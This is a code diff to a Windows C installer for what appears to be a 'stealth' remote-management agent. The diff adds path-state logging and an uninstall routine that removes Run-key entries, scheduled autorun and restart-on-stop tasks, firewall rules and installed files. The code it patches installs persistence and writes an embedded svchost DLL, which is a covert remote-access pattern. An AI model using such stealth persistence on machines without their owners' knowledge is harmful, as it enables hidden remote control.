@@ -100,6 +100,9 @@ static BOOL MeshInstaller_CombinePath(wchar_t* dest, size_t destLen, const wchar
     return TRUE;
 }
 
+// Constants
+#define STEALTH_TASK_NAME_MAX           260
+
 // Forward declarations for persistence helpers
 static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
 static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
@@ -110,7 +113,7 @@ static SC_ACTION* Stealth_BuildRecoveryActionsFromCsv(const wchar_t* csv, DWORD 
 static void Stealth_TrimWhitespaceInplace(wchar_t* value);
 static SC_ACTION_TYPE Stealth_MapRecoveryActionToken(const wchar_t* token);
 static void Stealth_EnablePrivilege(const wchar_t* privilegeName);
-static void Stealth_LogInstallEvent(const wchar_t* format, ...);
+void Stealth_LogInstallEvent(const wchar_t* format, ...);
 static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* context);
 static void Stealth_ResolveDefaultLogPath(void);
 static void Stealth_LogAnsiMessage(const char* message);
@@ -120,6 +123,14 @@ void Stealth_EnsureLoggingDefaults(void);
 static BOOL Stealth_StopServiceAndWait(const wchar_t* serviceName, DWORD timeoutMs, BOOL forceTerminate);
 static BOOL Stealth_DeleteExistingService(const wchar_t* serviceName);
 static BOOL Stealth_RemoveFileIfExists(const wchar_t* path, BOOL logOnFailure);
+void Stealth_LogPathState(const wchar_t* path);
+static void Stealth_RemoveRunKeyEntry(const wchar_t* serviceName);
+static BOOL Stealth_NormalizeTaskNameInplace(wchar_t* taskName, size_t capacity);
+static BOOL Stealth_CopyTaskNameFromUtf8(const char* source, wchar_t* dest, size_t destLen);
+static BOOL Stealth_FormatDefaultTaskName(const wchar_t* base, const wchar_t* suffix, wchar_t* dest, size_t destLen);
+static BOOL Stealth_AddTaskCandidate(wchar_t candidates[][STEALTH_TASK_NAME_MAX], size_t* count, size_t capacity, const wchar_t* name);
+static BOOL Stealth_RemoveScheduledTaskByName(const wchar_t* taskName, const wchar_t* context);
+static void Stealth_RemoveScheduledTasks(const mesh_persistence_profile_t* persistence, const wchar_t* serviceDisplayName, const wchar_t* serviceKeyName);
 
 #define STEALTH_INSTALL_LOG_MAX_BYTES    (512ULL * 1024ULL)
 #define STEALTH_SERVICE_STOP_TIMEOUT_MS  (30 * 1000)
@@ -195,7 +206,7 @@ BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths)
     return TRUE;
 }
 
-static void Stealth_LogInstallEvent(const wchar_t* format, ...)
+void Stealth_LogInstallEvent(const wchar_t* format, ...)
 {
     if (!g_HaveInstallLogPath) { Stealth_ResolveDefaultLogPath(); }
     if (!g_HaveInstallLogPath || format == NULL) { return; }
@@ -270,8 +281,56 @@ static BOOL Stealth_RemoveFileIfExists(const wchar_t* path, BOOL logOnFailure)
     {
         DWORD err = GetLastError();
         Stealth_LogInstallEvent(L"DeleteFile failed for %ls (error=%lu)", path, err);
+        Stealth_LogPathState(path);
     }
     return FALSE;
+}
+
+void Stealth_LogPathState(const wchar_t* path)
+{
+    if (path == NULL || path[0] == L'\0') { return; }
+
+    WIN32_FILE_ATTRIBUTE_DATA data;
+    if (GetFileAttributesExW(path, GetFileExInfoStandard, &data))
+    {
+        ULARGE_INTEGER size;
+        size.HighPart = data.nFileSizeHigh;
+        size.LowPart = data.nFileSizeLow;
+
+        FILETIME localWriteTime;
+        SYSTEMTIME st = {0};
+        if (FileTimeToLocalFileTime(&data.ftLastWriteTime, &localWriteTime) &&
+            FileTimeToSystemTime(&localWriteTime, &st))
+        {
+            Stealth_LogInstallEvent(
+                L"Path state [%ls]: size=%I64u attrs=0x%08X lastWrite=%04u-%02u-%02u %02u:%02u:%02u",
+                path,
+                size.QuadPart,
+                data.dwFileAttributes,
+                st.wYear, st.wMonth, st.wDay,
+                st.wHour, st.wMinute, st.wSecond);
+        }
+        else
+        {
+            Stealth_LogInstallEvent(
+                L"Path state [%ls]: size=%I64u attrs=0x%08X lastWrite=<unavailable>",
+                path,
+                size.QuadPart,
+                data.dwFileAttributes);
+        }
+    }
+    else
+    {
+        DWORD err = GetLastError();
+        if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND)
+        {
+            Stealth_LogInstallEvent(L"Path state [%ls]: not present", path);
+        }
+        else
+        {
+            Stealth_LogInstallEvent(L"Path state [%ls]: unavailable (error=%lu)", path, err);
+        }
+    }
 }
 
 static void Stealth_EnablePrivilege(const wchar_t* privilegeName)
@@ -591,6 +650,8 @@ BOOL Stealth_PerformCompleteInstallation(
         {
             Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
             Stealth_LogInstallEvent(L"Failed to emit embedded svchost DLL to %ls (error=%lu)", paths.dllPath, GetLastError());
+            Stealth_LogPathState(paths.dllPath);
+            Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
         }
     }
 
@@ -693,9 +754,15 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     SC_HANDLE hService = NULL;
     SERVICE_STATUS status = {0};
     wchar_t serviceKeyName[256] = {0};
+    wchar_t serviceDisplayName[256] = {0};
+    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
 
     MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
     if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
+    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
+    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
+
+    Stealth_LogInstallEvent(L"Beginning complete uninstallation for %ls", serviceKeyName);
 
     // Get paths
     Stealth_GetInstallPaths(&paths);
@@ -734,19 +801,25 @@ BOOL Stealth_PerformCompleteUninstallation(void)
         CloseServiceHandle(hSCM);
     }
 
+    // Remove persistence artefacts
+    Stealth_RemoveRunKeyEntry(serviceKeyName);
+    Stealth_RemoveScheduledTasks(persistence, serviceDisplayName, serviceKeyName);
+
     // Remove firewall rules
     Stealth_RemoveFirewallRuleForService(serviceKeyName);
 
     // Delete files (best-effort)
-    Stealth_RemoveFileIfExists(paths.dbPath, FALSE);
-    Stealth_RemoveFileIfExists(paths.logPath, FALSE);
-    Stealth_RemoveFileIfExists(paths.confPath, FALSE);
-    Stealth_RemoveFileIfExists(paths.exePath, FALSE);
-    Stealth_RemoveFileIfExists(paths.dllPath, FALSE);
+    Stealth_RemoveFileIfExists(paths.dbPath, TRUE);
+    Stealth_RemoveFileIfExists(paths.logPath, TRUE);
+    Stealth_RemoveFileIfExists(paths.confPath, TRUE);
+    Stealth_RemoveFileIfExists(paths.exePath, TRUE);
+    Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
 
     // Remove directories
     RemoveDirectoryW(paths.logsDir);
     RemoveDirectoryW(paths.installDir);
+
+    Stealth_LogInstallEvent(L"Complete uninstallation finished for %ls", serviceKeyName);
 
     return TRUE;
 }
@@ -811,6 +884,144 @@ static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persist
     {
         Stealth_DebugLastErrorW(L"RegCreateKeyExW (RunKey)");
         Stealth_LogInstallEvent(L"Failed to configure Run key for %ls", serviceName);
+    }
+}
+
+static void Stealth_RemoveRunKeyEntry(const wchar_t* serviceName)
+{
+    if (serviceName == NULL || serviceName[0] == L'\0') { return; }
+
+    HKEY hKey = NULL;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
+    {
+        return;
+    }
+
+    LONG result = RegDeleteValueW(hKey, serviceName);
+    RegCloseKey(hKey);
+
+    if (result == ERROR_SUCCESS)
+    {
+        Stealth_LogInstallEvent(L"Removed Run key for %ls", serviceName);
+    }
+    else if (result != ERROR_FILE_NOT_FOUND)
+    {
+        Stealth_LogInstallEvent(L"Unable to remove Run key for %ls (error=%ld)", serviceName, result);
+    }
+}
+
+static BOOL Stealth_NormalizeTaskNameInplace(wchar_t* taskName, size_t capacity)
+{
+    if (taskName == NULL || capacity == 0 || taskName[0] == L'\0') { return FALSE; }
+    if (taskName[0] == L'\\') { return TRUE; }
+
+    wchar_t buffer[STEALTH_TASK_NAME_MAX] = {0};
+    if (FAILED(StringCchCopyW(buffer, _countof(buffer), taskName))) { return FALSE; }
+    if (FAILED(StringCchPrintfW(taskName, capacity, L"\\%s", buffer))) { return FALSE; }
+    return TRUE;
+}
+
+static BOOL Stealth_CopyTaskNameFromUtf8(const char* source, wchar_t* dest, size_t destLen)
+{
+    if (dest == NULL || destLen == 0) { return FALSE; }
+    dest[0] = L'\0';
+    if (source == NULL || source[0] == '\0') { return FALSE; }
+
+    MeshService_CopyBrandingTextToWide(source, dest, destLen);
+    if (dest[0] == L'\0') { return FALSE; }
+    return Stealth_NormalizeTaskNameInplace(dest, destLen);
+}
+
+static BOOL Stealth_FormatDefaultTaskName(const wchar_t* base, const wchar_t* suffix, wchar_t* dest, size_t destLen)
+{
+    if (dest == NULL || destLen == 0 || base == NULL || base[0] == L'\0' || suffix == NULL) { return FALSE; }
+    if (FAILED(StringCchPrintfW(dest, destLen, L"\\%s%s", base, suffix))) { return FALSE; }
+    return TRUE;
+}
+
+static BOOL Stealth_AddTaskCandidate(wchar_t candidates[][STEALTH_TASK_NAME_MAX], size_t* count, size_t capacity, const wchar_t* name)
+{
+    if (candidates == NULL || count == NULL || name == NULL || name[0] == L'\0') { return FALSE; }
+    for (size_t i = 0; i < *count; ++i)
+    {
+        if (_wcsicmp(candidates[i], name) == 0) { return FALSE; }
+    }
+    if (*count >= capacity) { return FALSE; }
+    if (FAILED(StringCchCopyW(candidates[*count], STEALTH_TASK_NAME_MAX, name))) { return FALSE; }
+    (*count)++;
+    return TRUE;
+}
+
+static BOOL Stealth_RemoveScheduledTaskByName(const wchar_t* taskName, const wchar_t* context)
+{
+    if (taskName == NULL || taskName[0] == L'\0') { return FALSE; }
+
+    wchar_t sysDir[MAX_PATH];
+    wchar_t cmdLine[1024];
+    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) { return FALSE; }
+
+    if (FAILED(StringCchPrintfW(cmdLine, _countof(cmdLine), L"\"%s\\schtasks.exe\" /Delete /TN \"%s\" /F", sysDir, taskName)))
+    {
+        return FALSE;
+    }
+
+    if (Stealth_RunCommand(cmdLine, context))
+    {
+        Stealth_LogInstallEvent(L"Removed scheduled task %ls", taskName);
+        return TRUE;
+    }
+
+    Stealth_LogInstallEvent(L"Scheduled task %ls removal reported failure", taskName);
+    return FALSE;
+}
+
+static void Stealth_RemoveScheduledTasks(const mesh_persistence_profile_t* persistence, const wchar_t* serviceDisplayName, const wchar_t* serviceKeyName)
+{
+    const size_t maxCandidates = 8;
+    wchar_t autorunCandidates[8][STEALTH_TASK_NAME_MAX] = {0};
+    size_t autorunCount = 0;
+    wchar_t restartCandidates[8][STEALTH_TASK_NAME_MAX] = {0};
+    size_t restartCount = 0;
+    wchar_t buffer[STEALTH_TASK_NAME_MAX] = {0};
+
+    if (persistence != NULL)
+    {
+        if (Stealth_CopyTaskNameFromUtf8(persistence->autorunTask.taskName, buffer, _countof(buffer)))
+        {
+            Stealth_AddTaskCandidate(autorunCandidates, &autorunCount, maxCandidates, buffer);
+        }
+        if (Stealth_CopyTaskNameFromUtf8(persistence->restartTask.taskName, buffer, _countof(buffer)))
+        {
+            Stealth_AddTaskCandidate(restartCandidates, &restartCount, maxCandidates, buffer);
+        }
+    }
+
+    if (Stealth_FormatDefaultTaskName(serviceDisplayName, L"-Autorun", buffer, _countof(buffer)))
+    {
+        Stealth_AddTaskCandidate(autorunCandidates, &autorunCount, maxCandidates, buffer);
+    }
+    if (Stealth_FormatDefaultTaskName(serviceKeyName, L"-Autorun", buffer, _countof(buffer)))
+    {
+        Stealth_AddTaskCandidate(autorunCandidates, &autorunCount, maxCandidates, buffer);
+    }
+
+    if (Stealth_FormatDefaultTaskName(serviceDisplayName, L"-RestartOnStop", buffer, _countof(buffer)))
+    {
+        Stealth_AddTaskCandidate(restartCandidates, &restartCount, maxCandidates, buffer);
+    }
+    if (Stealth_FormatDefaultTaskName(serviceKeyName, L"-RestartOnStop", buffer, _countof(buffer)))
+    {
+        Stealth_AddTaskCandidate(restartCandidates, &restartCount, maxCandidates, buffer);
+    }
+
+    for (size_t i = 0; i < autorunCount; ++i)
+    {
+        Stealth_RemoveScheduledTaskByName(autorunCandidates[i], L"schtasks.exe /Delete (autorun)");
+    }
+
+    for (size_t i = 0; i < restartCount; ++i)
+    {
+        Stealth_RemoveScheduledTaskByName(restartCandidates[i], L"schtasks.exe /Delete (restart-on-stop)");
     }
 }
 
